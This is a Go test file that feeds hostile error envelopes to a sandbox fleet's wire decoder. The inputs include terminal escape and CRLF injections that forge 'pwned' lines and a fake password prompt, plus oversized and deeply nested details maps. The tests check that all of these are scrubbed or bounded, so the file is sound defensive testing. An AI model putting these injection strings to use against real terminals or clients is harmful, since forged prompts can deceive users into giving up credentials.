			if strings.Contains(e.Code, "admin") {
				t.Errorf("code = %q; clients switch on it and it is copied into the JSON body", e.Code)
			}
		}},

	{"Details", "a megabyte of details", `{"kind":"internal","msg":"boom","details":{"pad":"` + strings.Repeat("d", 500000) + `"}}`,
		func(t *testing.T, e *Error) {
			if n := detailBytes(t, e.Details); n > 16384 {
				t.Errorf("details are %d bytes; the REST edge copies them into every answer", n)
			}
		}},
	{"Details", "ten thousand keys", `{"kind":"internal","msg":"boom","details":{` + manyDetailKeys(10000) + `}}`,
		func(t *testing.T, e *Error) {
			if len(e.Details) > 16 {
				t.Errorf("details carry %d keys; no failure in this tree has more than three", len(e.Details))
			}
		}},
	{"Details", "escapes in a detail", `{"kind":"internal","msg":"boom","details":{"running":["\u001b[2Jalicebox\r\nsparkbox: pwned"]}}`,
		// Scrubbed rather than refused, on the same grounds as a running name:
		// it is a fact the user has to act on, and blanking it would leave them
		// reading about a sandbox nobody would name. What must not survive is
		// the steering — the escape and the CR — not the peer's choice of words.
		func(t *testing.T, e *Error) {
			names, _ := e.Details["running"].([]any)
			if len(names) != 1 {
				t.Fatalf("details = %#v, want the one name kept", e.Details)
			}
			got, _ := names[0].(string)
			assertReadable(t, "details.running[0]", got)
			if !strings.Contains(got, "alicebox") {
				t.Errorf("details.running[0] = %q, which no longer names the sandbox to pause", got)
			}
		}},
	// Nothing this tree puts in Details nests, so a nested value is a peer
	// building a structure for somebody else's parser rather than a fact for a
	// client to render.
	{"Details", "a deeply nested detail", `{"kind":"internal","msg":"boom","details":{"a":{"b":{"c":{"d":[[[["deep"]]]]}}}}}`,
		func(t *testing.T, e *Error) {
			if raw, _ := json.Marshal(e.Details); strings.Contains(string(raw), "deep") {
				t.Errorf("details = %s; a details map carries flat facts, not a tree", raw)
			}
		}},

	{"Verbatim", "verbatim with a forged sentence", `{"kind":"not_found","verbatim":true,"msg":"no sandbox named \"x\"\r\nsparkbox: enter your password:"}`,
		func(t *testing.T, e *Error) {
			if strings.Contains(e.Msg, "password") {
				t.Errorf("msg = %q; verbatim is exactly the branch that prints it unwrapped", e.Msg)
			}
		}},

	{"Host", "a cause that cannot be rendered", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":3}}`,
		func(t *testing.T, e *Error) {
			if e.Err != nil {
				t.Errorf("cause = %v, want none", e.Err)
			}
		}},
}

// manyDetailKeys builds a details map no failure in this tree would produce, as
// the JSON object body a peer could nonetheless send.
func manyDetailKeys(n int) string {
	parts := make([]string, n)
	for i := range parts {
		parts[i] = fmt.Sprintf("%q:%d", fmt.Sprintf("k%05d", i), i)
	}
	return strings.Join(parts, ",")
}

// TestWireHostileEnvelope puts every probe through the same three consumers the
// envelope actually reaches: the two SSH printers, WriteHeader, and the process
// exit status. The per-probe check is the specific claim; these four assertions
// are the general one, and they run for every probe.
func TestWireHostileEnvelope(t *testing.T) {
	for _, tc := range envelopeProbes {
		t.Run(tc.field+"/"+tc.name, func(t *testing.T) {
			var w WireError
			if err := json.Unmarshal([]byte(tc.raw), &w); err != nil {
				t.Fatalf("decode: %v", err)
			}
			got := FromWire(&w)
			if got == nil {
				t.Fatal("FromWire dropped a decoded error entirely")
			}

			// The terminal, both ways in: fail()'s wrapper and failCtl()'s bare
			// sentence. A CRLF terminator is the printer's, not the message's.
			line := renderNoPanic(t, "sshgw.fail", func() string { return mimicFail("pause", got) })
			ctl := renderNoPanic(t, "sshgw.failCtl", func() string { return mimicFailCtl(got) })
			assertReadable(t, "sshgw.fail", strings.TrimSuffix(line, "\r\n"))
			assertReadable(t, "sshgw.failCtl", strings.TrimSuffix(ctl, "\r\n"))

			assertAnswersAsAFailure(t, got)
			assertExitsAsAFailure(t, got)

			// Whatever else it says, it must still say something: Error() is
			// Msg, and a blank one is a failure that renders as nothing.
			if strings.TrimSpace(got.Error()) == "" {
				t.Error("Error() is empty; a failure with no sentence renders as nothing at all")
			}
			if n := detailBytes(t, got.Details); n > 16384 {
				t.Errorf("details are %d bytes", n)
			}
			if tc.check != nil {
				tc.check(t, got)
			}
		})
	}
}

// TestWireEveryEnvelopeFieldIsProbed is the structural guard. Twice now a field
// has crossed this boundary trusted because nothing forced anyone to think
// about it; this makes adding a field to WireError without a hostile probe a
// test failure rather than an oversight.
func TestWireEveryEnvelopeFieldIsProbed(t *testing.T) {
	probed := map[string]bool{}
	for _, tc := range envelopeProbes {
		probed[tc.field] = true
	}
	wire := reflect.TypeOf(WireError{})
	for i := 0; i < wire.NumField(); i++ {
		name := wire.Field(i).Name
		if !probed[name] {
			t.Errorf("WireError.%s is node-authored and no probe in envelopeProbes feeds it hostile input; "+
				"add one before this field reaches a renderer", name)
		}
	}
	for name := range probed {
		if _, ok := wire.FieldByName(name); !ok {
			t.Errorf("envelopeProbes names WireError.%s, which no longer exists", name)
		}
	}
}

// TestWireHonestEnvelopeIsUnchanged is the other half of the bargain: the
// bounds above may not cost an honest node one byte. It covers the fields the
// taxonomy actually populates, including the two Status overrides (499 for a
// hung-up caller, 504 for a deadline) and the Exit 1 that a StateError pins,
// because a validator that clamped those would be a silent behaviour change on
// every fleet.
func TestWireHonestEnvelopeIsUnchanged(t *testing.T) {
	honest := []*Error{
		AsError("start", &host.LimitError{Max: 2, Running: []string{"alicebox", "bobbox"}}),
		AsError("start", &host.CapacityError{RequestedMB: 8192, UsedMB: 40000, BudgetMB: 45000}),
		AsError("create", &host.DiskQuotaError{Owner: "alice", RequestedMB: 25000, UsedMB: 90000, PoolMB: 100000}),
		AsError("rename", &host.StateError{Code: "sandbox_archived", Msg: `sandbox "x" is archived`}),
		AsError("pause", context.Canceled),
		AsError("pause", context.DeadlineExceeded),
		NotFound("pause", "sandbox", "ghost"),
		Invalid("resize", "bad_size", "size must be between 1 and %d MB", MaxDiskMB),
		Disabled("archive", "archiving isn't enabled on this host."),
		Denied("invite", "not_operator", "only operators can mint invites."),
		{Kind: KindCapacity, Op: "node.revoke", Code: "node_revoked",
			Msg:      `node "boxb" is no longer part of this fleet`,
			Hint:     "Nothing on that machine was deleted; it can enrol again and be approved.",
			Details:  map[string]any{"node": "boxb"},
			Verbatim: true, Exit: 1, Status: 503},
		{Kind: KindInvalid, Op: "keys.add", Code: "bad_key", Msg: "that does not look like a public key",
			Verbatim: true, Exit: 1, Status: 400},
	}

	for _, want := range honest {
		t.Run(want.Op+"/"+want.Code, func(t *testing.T) {
			raw, err := json.Marshal(ToWire(want.Op, want))
			if err != nil {
				t.Fatalf("marshal: %v", err)
			}
			var w WireError
			if err := json.Unmarshal(raw, &w); err != nil {
				t.Fatalf("unmarshal: %v", err)
			}
			got := FromWire(&w)

			if got.Op != want.Op || got.Code != want.Code {
				t.Errorf("op/code = %q/%q, want %q/%q", got.Op, got.Code, want.Op, want.Code)
			}
			if got.Msg != want.Msg {
				t.Errorf("msg = %q, want %q", got.Msg, want.Msg)
			}
			if got.Hint != want.Hint {
				t.Errorf("hint = %q, want %q", got.Hint, want.Hint)
			}
			if got.Verbatim != want.Verbatim {
				t.Errorf("verbatim = %v, want %v", got.Verbatim, want.Verbatim)
			}
			if got.Exit != want.Exit {
				t.Errorf("exit field = %d, want %d", got.Exit, want.Exit)
			}
			if got.Status != want.Status {
				t.Errorf("status field = %d, want %d", got.Status, want.Status)
			}
			if got.ExitCode() != want.ExitCode() || got.HTTPStatus() != want.HTTPStatus() {
				t.Errorf("exit/status = %d/%d, want %d/%d",
					got.ExitCode(), got.HTTPStatus(), want.ExitCode(), want.HTTPStatus())
			}
			// Details survive as the JSON they became, which is the shape every
			// consumer downstream already handles (numbers are float64).
			var wantDetails map[string]any
			if want.Details != nil {
				blob, _ := json.Marshal(want.Details)
				if err := json.Unmarshal(blob, &wantDetails); err != nil {
					t.Fatalf("details: %v", err)
				}
			}
			if !reflect.DeepEqual(got.Details, wantDetails) {
				t.Errorf("details = %#v, want %#v", got.Details, wantDetails)
			}
		})
	}
}
